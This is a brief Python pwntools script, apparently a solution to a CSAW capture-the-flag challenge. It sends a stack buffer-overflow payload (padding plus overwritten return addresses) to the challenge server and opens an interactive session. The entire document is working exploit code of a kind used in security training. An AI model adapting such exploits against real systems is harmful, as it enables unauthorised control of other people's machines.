from pwn import *

addr = 0x401172 
payload = 64 * b'A' + p64(0x4012ca)+ p64(addr)
r = remote('pwn.chal.csaw.io', 5000)
r.sendlineafter(">", payload)
r.interactive()
